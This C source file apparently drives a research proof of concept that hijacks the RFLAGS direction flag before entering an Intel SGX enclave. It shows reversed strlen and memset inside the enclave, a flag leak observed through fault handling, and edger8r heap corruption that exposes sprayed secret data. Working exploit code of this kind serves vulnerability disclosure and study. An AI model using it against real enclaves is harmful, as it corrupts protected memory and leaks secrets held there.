#include <stdio.h>
#include <sgx_urts.h>
#include <sgx_error.h>
#include <sys/mman.h>
#include <signal.h>
#include "Enclave/inc_u.h"

sgx_status_t sgx_rv;
char __attribute__((aligned(0x1000))) trigger_page[0x1000];
char buf[100];

#define ENCLAVE_PATH                "./Enclave/inc.so"
#define ENCLAVE_DBG                 1

#define SGX_ASSERT(f)  { if ( SGX_SUCCESS != (sgx_rv = (f)) )           \
 {                                                                      \
       printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__,  \
                                              __LINE__, sgx_rv);        \
       abort();                                                         \
 } }

#define ASSERT(cond)                                                    \
    do {                                                                \
        if (!(cond))                                                    \
        {                                                               \
            perror("[" __FILE__ "] assertion '" #cond "' failed");      \
            abort();                                                    \
        }                                                               \
    } while(0)

#define PFN_MASK 0xfff 
#define GET_PFN(adrs) ((void*) (((uint64_t) adrs) & ~PFN_MASK))

void fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    uint64_t flags;
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
        case SIGSEGV:
            if (si->si_addr != GET_PFN(trigger_page))
            {
                printf("--> FAIL\n");

                printf("enclave output buf=");
                for (int j=0; j < 100; j++)
                    printf("%c", buf[j] ? buf[j] : '0');
                printf("\n");

                printf("\npage fault when dereferencing %p; exiting..\n", si->si_addr);
                exit(0);
            }

            flags = uc->uc_mcontext.gregs[REG_EFL];
            printf("RFLAGS after AEX=%p   (DF=%d)\n", flags, !!(flags & (1<<10)));

            ASSERT( !mprotect(trigger_page, 0x1000, PROT_READ | PROT_WRITE) );
            break;
    
        default:
            printf("Caught unknown signal '%d'\n", signo);
            abort();
    }
}

int main( int argc, char **argv )
{
	sgx_enclave_id_t eid = 0;
	sgx_status_t ret = SGX_SUCCESS;
    struct sigaction act, old_act;
    int len  = 0, flags = 0;

    puts("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_PATH, ENCLAVE_DBG,
                                    NULL, NULL, &eid, NULL ) );
    puts("--> OK");

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF strlen direction hijack");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w DF=%d\n", i % 2);
        len = 0;
        /*
         * NOTE: simply doing asm("std") is not sufficiently close here:
         * RFLAGS.DF will still be overriden before ENCLU. We modified the
         * untrusted runtime to allow setting RFLAGS.DF right before EENTER.
         */
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_strlen(eid, &len) );
        printf("enclave strlen=%d\n", len);
    }
    sgx_do_std(0);

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF memset direction hijack");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w DF=%d\n", i % 2);
        memset(buf, 'X', 100);
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_memset(eid, buf) );

        printf("enclave memset=");
        for (int j=0; j < 100; j++)
            printf("%c", buf[j]);
        printf("\n");
    }
    sgx_do_std(0);

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF side-channel leakage EEXIT/AEX");
    printf("--------------------------------------------------\n");

    puts("Registering fault handler...");
    memset(&act, sizeof(sigaction), 0);
    memset(trigger_page, 0x1000, 'A');
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;
    sigfillset(&act.sa_mask);
    ASSERT (!sigaction( SIGSEGV, &act, &old_act ));

    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w set=%d; scrub=%d\n", i % 2, i > 1);
        ASSERT( !mprotect(trigger_page, 0x1000, PROT_NONE) );
        SGX_ASSERT( ecall_leak_df(eid, i % 2, i > 1, trigger_page) );
        flags = sgx_do_std(0);
        printf("RFLAGS after EEXIT=%p (DF=%d)\n", flags, !!(flags & (1<<10)));
    }

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF edger8r memset heap corruption");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        char s = 'S';
        printf("\nSpraying enclave heap with secret '%c'\n", s);
        SGX_ASSERT( ecall_fill_heap(eid, s) );

        printf("Running victim w DF=%d\n", i % 2);
        memset(buf, 'X', 100);
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_edger8r(eid, buf) );

        printf("--> OK\n");
        printf("enclave output buf=");
        for (int j=0; j < 100; j++)
            printf("%c", buf[j] ? buf[j] : '0');
        printf("\n");
    }
    sgx_do_std(0);


    puts("\nall is well; exiting..");
    return 0;
}
